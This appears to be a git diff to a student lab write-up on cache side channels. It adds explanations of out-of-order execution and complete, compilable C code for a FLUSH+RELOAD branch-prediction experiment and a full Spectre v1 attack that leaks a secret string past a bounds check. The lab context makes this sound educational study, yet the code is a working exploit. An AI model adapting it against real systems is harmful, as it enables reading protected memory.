@@ -538,25 +538,33 @@ To ensure both consistency and precision in our initial observations, the code w
 
 1.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161594935494053948/image.png?ex=6538de96&is=65266996&hm=7a6eb94e5ffca9bf19cb74b3428fe28c38ec99a8db2c52d89b2f06fa23d31724&)
+
 2.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595962754609192/CacheTime3.png?ex=6538df8a&is=65266a8a&hm=e8a17babca79f57d2f60b281dee5ce042183a024ac78c5c49c0a44b08df4b0c3&)
+
 3.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595972653154396/CacheTime4.png?ex=6538df8d&is=65266a8d&hm=ceddf2c6e93bc94e3682a91afc052f8c5bb74aa4aec3b74e8d957fbde8af4f09&)
+
 4.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595980668469360/CacheTime5.png?ex=6538df8f&is=65266a8f&hm=25305100165367e6cfe2d740b62e4d148dcec2a2a018d47485756fd94fce140d&)
+
 5.
 ![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595986997673984/CacheTime6.png?ex=6538df90&is=65266a90&hm=7e799954bf8f22babff53e9d299566467617be9bc7ec9bf9e37d5fbf46628eaa&=)
+
 6.
 ![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595991888232468/CacheTime7.png?ex=6538df91&is=65266a91&hm=87e3cc0b7d4edac4d06bdf22622508854a16e33a366e13047a84adb7ed1f1f49&=)
+
 7.
 ![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595996913012736/CacheTime8.png?ex=6538df93&is=65266a93&hm=c1b5f8e970eddf2c488c843eb7372119714566c370bf9eabb89aca3b36d4e613&=)
+
 8.
 ![Image](https://media.discordapp.net/attachments/1131246972372791429/1161596004471164998/CacheTime9.png?ex=6538df94&is=65266a94&hm=db25339a9daa55f5ce25e750fccafe4d35b78e455c8dc3840ca61643d6ed1813&=)
+
 9.
 ![Image](https://media.discordapp.net/attachments/1131246972372791429/1161596009340731412/CacheTime10.png?ex=6538df96&is=65266a96&hm=2873bb212992741dcc804eab4800e3b8fae3abe7ab0e7df6770b92bb67d986dd&=)
+
 10.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161601101578129418/CacheTime11.png?ex=6538e454&is=65266f54&hm=2805e63a814cdc5324adcaa903856ef3cb5e58201f4575cfbf73406987d09ad7&)
-
 ### Step 2: Using cache as a Side Channel attack
 
 ```c
@@ -624,14 +632,18 @@ gcc -march=native FlushReload.c -o FlushReload
 ```
 #### Result:
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161634969442074624/FlushReload1.png?ex=653903de&is=65268ede&hm=f65b6dcf476d095045335466739b5a424e07c9dd81b82dd10459aac55770f9d4&)
+
 As illustrated in the image above, despite encountering multiple results during the execution of FlushReload indicating that we have hit cashe_threshold multiple times, we still successfully pinpointed our secret value of 94. It has to be noted that we have conducted the test an additional four times to ensure the precision of our findings, and each of these repeated trials revealed the secret value.
 
 1.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161639103943680040/FlushReload2.png?ex=653907b8&is=652692b8&hm=cc463e00b079ac0d0a0d4adee23709e7a62bad30f01d910188455b2c7376edc6&)
+
 2.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640100736802877/FlushReload3.png?ex=653908a6&is=652693a6&hm=d1020f4457562f98cb62b3f71cd4a28e3587b67d46b2b23359ded34dcb6f885c&)
+
 3.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640100736802877/FlushReload3.png?ex=653908a6&is=652693a6&hm=d1020f4457562f98cb62b3f71cd4a28e3587b67d46b2b23359ded34dcb6f885c&)
+
 4.
 ![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640807070171196/FlushReload4.png?ex=6539094e&is=6526944e&hm=ca583ef9bc646b94c3ebffb5b91e5ea61d6c51be3be84c91ee285c9328feb2b6&)
 
@@ -650,7 +662,7 @@ In the provided code, a set of global variables takes on pivital roles in the pr
 #### flushSideChannel()
 >The **`flushSideChannel()`** function in a `FLUSH+RELOAD` attack prepares the memory state for cache timing measurements. This is achieved by writing to the `array` to bring relevant memory locations into RAM and then purging the array's values from the CPU cache, establishing a consistent basis with no cached array elements. This sets the stage for precise monitoring of following memory access patterns, a crucial phase in the cache timing attack.
 
-### reloadSideChannel()
+#### reloadSideChannel()
 >The `reloadSideChannel` function in the context of a FLUSH+RELOAD attack serves to identify cached memory locations through the measurement of access times. It performs the following key tasks:
 >1. **Initialization**: It prepares the necessary variables for temporary storage and timing measurements.
 >2. **Memory Access Loop**: The function iterates through 256 memory locations, recording access times for each.
@@ -660,6 +672,197 @@ In the provided code, a set of global variables takes on pivital roles in the pr
 >This function plays a crucial role in the FLUSH+RELOAD attack. It allows us to observe which memory locations are cached and potentially discover the hidden secret value by monitoring how memory is accessed.
 
 ### Task 3: Out-of-Order Execution and Branch Prediction
+What is Out-of-Order execution? Out-of-order execution, is a performance enhancement strategy that enables the CPU to make the most efficient use of its execution units. Rather than adhering to a strictly sequential order for processing instructions, the CPU performs them in parallel as soon as all necessary resources become accessible. This means that while one execution unit is engaged in the current operation, other units can proceed with their tasks ahead of it.
 
+To demonstrate the Out-Of-Order Execution we will use the following code
+```c
+#include <emmintrin.h>
+#include <x86intrin.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdint.h>
 
+int size = 10;
+uint8_t array[256*4096];
+uint8_t temp = 0;
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+void flushSideChannel()
+{
+  int i;
+  // Write to array to bring it to RAM to prevent Copy-on-write
+  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
+  //flush the values of the array from cache
+  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
+}
+
+void reloadSideChannel()
+{
+  int junk=0;
+  register uint64_t time1, time2;
+  volatile uint8_t *addr;
+  int i;
+  for(i = 0; i < 256; i++){
+    addr = &array[i*4096 + DELTA];
+    time1 = __rdtscp(&junk);
+    junk = *addr;
+    time2 = __rdtscp(&junk) - time1;
+    if (time2 <= CACHE_HIT_THRESHOLD){
+	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
+        printf("The Secret = %d.\n",i);
+    }
+  } 
+}
+
+void victim(size_t x)
+{
+  if (x < size) {  
+  temp = array[x * 4096 + DELTA];  
+  }
+}
+
+int main() {
+  int i;
+  // FLUSH the probing array
+  flushSideChannel();
+  // Train the CPU to take the true branch inside victim()
+  for (i = 0; i < 10; i++) {   
+   _mm_clflush(&size); 
+   victim(i);
+  }
+  // Exploit the out-of-order execution
+  _mm_clflush(&size);
+  for (i = 0; i < 256; i++)
+   _mm_clflush(&array[i*4096 + DELTA]); 
+  victim(97);  
+  // RELOAD the probing array
+  reloadSideChannel();
+  return (0); 
+}
+```
+
+Code Compilation
+```
+gcc -march=native SpectreExperiment.c -o SpectreExperiment
+```
+Result:
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161724274944524408/received_1018118872572351.png?ex=6539570a&is=6526e20a&hm=4954d78620a171e8dad88bb7a7ab6b92388ddf1786f3c65d912b328bae3bedca&)
+Based on our results, it's clear that our Out-Of-Execution demonstration succeeded. We retrieved the secret code which is **`97`** that we added to our victim code. This success is due to **"training"** the CPU within the **`for`** loop. We repeatedly called the `**victim()**` function with small values from 0 to 9, ensuring the **`if-condition`** inside **'victim()'** always evaluated to **'true'** because these values were always less than **`size`**. This training conditioned the CPU to expect 'true' outcomes. We then introduced our secret value to **'victim()'** which triggered the **'false-branch'** of the **'if-condition'** inside **'victim'**. However, we previously flushed the **'size'** variable from memory, causing a delay in obtaining its result. During this time the CPU made a prediction and initiated speculative execution.
+
+### The Spectre Attack
+We will now demonstrate the entire Spectre Attack all at once using the following code below. The aim of this program is to access the **`buffer[x]`** that is within **`restrictedAccess`** just like our previous **Out-of-order execution**.
+Note that we have calculated the offset of the secret from the beginning of the buffer, this is done through **`s = restrictedAccess(larger_x);`**, **`array[s*4096 + DELTA] += 88;`** and **`size_t larger_x = (size_t)(secret - (char*)buffer);`**.
+```c
+#include <emmintrin.h>
+#include <x86intrin.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdint.h>
+
+unsigned int buffer_size = 10;
+uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
+uint8_t temp = 0;
+char *secret = "Some Secret Value";   
+uint8_t array[256*4096];
+
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+// Sandbox Function
+uint8_t restrictedAccess(size_t x)
+{
+  if (x < buffer_size) {
+     return buffer[x];
+  } else {
+     return 0;
+  } 
+}
+
+void flushSideChannel()
+{
+  int i;
+  // Write to array to bring it to RAM to prevent Copy-on-write
+  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
+  //flush the values of the array from cache
+  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
+}
+
+static int scores[256];
+void reloadSideChannelImproved()
+{
+  int i;
+  volatile uint8_t *addr;
+  register uint64_t time1, time2;
+  int junk = 0;
+  for (i = 0; i < 256; i++) {
+    addr = &array[i * 4096 + DELTA];
+    time1 = __rdtscp(&junk);
+    junk = *addr;
+    time2 = __rdtscp(&junk) - time1;
+    if (time2 <= CACHE_HIT_THRESHOLD)
+      scores[i]++; /* if cache hit, add 1 for this value */
+  } 
+}
+
+void spectreAttack(size_t larger_x)
+{
+  int i;
+  uint8_t s;
+  volatile int z;
+  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+  // Train the CPU to take the true branch inside victim().
+  for (i = 0; i < 10; i++) {
+    _mm_clflush(&buffer_size);
+    for (z = 0; z < 100; z++) { }
+    restrictedAccess(i);  
+  }
+  // Flush buffer_size and array[] from the cache.
+  _mm_clflush(&buffer_size);
+  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+  // Ask victim() to return the secret in out-of-order execution.
+  for (z = 0; z < 100; z++) { }
+  s = restrictedAccess(larger_x);
+  array[s*4096 + DELTA] += 88;
+}
+
+int getascii(size_t larger_x)
+{
+  int i;
+  uint8_t s;
+  flushSideChannel();
+  _mm_clflush(&larger_x);
+  for (i = 0;i< 256;i++) scores[i] = 0;
+  for (i = 0;i< 1000;i++) {
+    spectreAttack(larger_x);
+    reloadSideChannelImproved();
+  }
+
+  int max = 1;
+  for (i = 2; i < 256; i ++ ) {
+    if(scores[max] < scores[i]) max = i;
+  }
+
+  if (scores[max] == 0) {
+    return 0;
+  } else {
+    return max;
+  }
+}
+
+int main() {
+  size_t larger_x = (size_t)(secret-(char*)buffer);
+  int s = getascii(larger_x);
+  printf("The secret is:\n");
+  while(s != 0) {
+    printf("%c\n",s);
+    larger_x++;
+    s = getascii(larger_x);
+  }
+  return 0;
+}
+```
+Result:
+```
+```
 
